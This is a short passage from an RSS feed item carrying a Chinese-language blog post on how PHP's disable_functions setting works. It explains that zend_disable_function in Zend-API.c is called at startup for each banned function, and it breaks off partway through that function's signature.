&lt;h1 id=&#34;disable-functions&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#disable-functions&#34;&gt;#&lt;/a&gt; Disable Functions&lt;/h1&gt;
&lt;h2 id=&#34;机制实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机制实现&#34;&gt;#&lt;/a&gt; 机制实现&lt;/h2&gt;
&lt;p&gt;PHP 中 Disable Function 的实现是在 php-src/Zend/Zend-API.c 中。PHP 在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用  &lt;code&gt;zend_disable_function&lt;/code&gt;  来实现禁止的效果。&lt;/p&gt;
&lt;p&gt;这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ZEND_API &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;zend_disable_function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;function_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; function_name_length&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
    </channel>
</rss>
